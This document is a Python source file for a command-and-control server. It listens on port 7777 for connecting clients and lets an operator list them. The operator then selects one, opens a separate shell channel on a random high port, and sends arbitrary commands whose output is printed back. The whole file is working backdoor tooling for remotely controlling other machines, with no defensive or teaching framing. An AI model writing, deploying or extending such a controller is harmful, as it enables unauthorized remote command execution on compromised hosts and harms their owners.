import socket
import sys
import threading
import logging
import random
from sockettools import getFromSocket
PORT = 7777
logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] (%(threadName)-10s) %(message)s',)
clientList = []


class clientThread(threading.Thread):
    def __init__(self, clientSocket, clientAddr):
        threading.Thread.__init__(self, name="Thread " + clientAddr[0])
        self.clientAddr = clientAddr
        self.clientControlSocket = clientSocket

    def run(self):
        random.seed()
        ephemeralPort = random.randint(49152, 65535)
        shellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                shellSocket.bind(('', ephemeralPort,))
            except socket.error as e:
                if e.errno == 98:
                    ephemeralPort = random.randint(49152, 65535)
                else:
                    logging.error('Different binding error')
            finally:
                break
        logging.debug('Sucessfully opened new socket at port %s', ephemeralPort)
        # announcement = "Please open a new connection to this host on port " + str(ephemeralPort)
        self.clientControlSocket.sendall(str(ephemeralPort).encode('utf_8'))
        shellSocket.listen(1)
        while True:
            (clientShellSocket, clientShellAddr) = shellSocket.accept()
            if clientShellAddr[0] != self.clientAddr[0]:
                clientShellSocket.close()
                logging.warning('Illegal connection from %s', clientShellAddr)
            else:
                logging.debug('Accepted shell connection from %s', clientShellAddr)
                while True:
                    answer = input(
                        '''
1. Enter a command for this one
2. Quit this host
Your choice: '''
                    )
                    if answer == "1":
                        cmd = input("Your command: ")
                        clientShellSocket.sendall(str(len(cmd)).encode('utf_8').zfill(8))
                        clientShellSocket.sendall(cmd.encode('utf_8'))
                        try:
                            stdoutLength = getFromSocket(clientShellSocket, 8)
                            stdoutLength = int(stdoutLength)
                        except ValueError:
                            logging.debug('Got gibberish stdoutLength %s', stdoutLength)
                        except ConnectionResetError:
                            logging.debug('There is a problem with client shell socket')
                        stdout = getFromSocket(clientShellSocket, stdoutLength)
                        print(stdout.decode('utf_8'))
                    if answer == "2":
                        break
                clientShellSocket.close()
                break


def startCCserver():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('', PORT,))
    server.listen(5)
    while True:
        (clientSocket, clientAddr) = server.accept()
        logging.debug('Client connected from %s', clientAddr)
        clientList[:] = [client for client in clientList if client['address'][0] != clientAddr[0]]
        clientList.append(
            dict(
                socket=clientSocket,
                address=clientAddr,
            )
        )


if __name__ == "__main__":
    if len(sys.argv) > 1:
        PORT = sys.argv[1]
    controlThread = threading.Thread(name="Control Thread", target=startCCserver, daemon=True)
    controlThread.start()
    while True:
        answer = input(
            '''
1: List current clients connected to the system
2: Select a client to manage
3: Exit
Your choice: '''
        )
        if answer == "1":
            print("List of client: ")
            for client in clientList:
                print(client['address'])
        if answer == "2":
            addr = input("Please enter client's IP address: ")
            client = [x for x in clientList if x['address'][0] == addr]
            if len(client) == 0:
                print("Dafuq you entered there is no client with that address.")
            else:
                newClient = clientThread(client[0].get('socket'), client[0].get('address'))
                newClient.start()
                newClient.join()
        if answer == "3":
            break
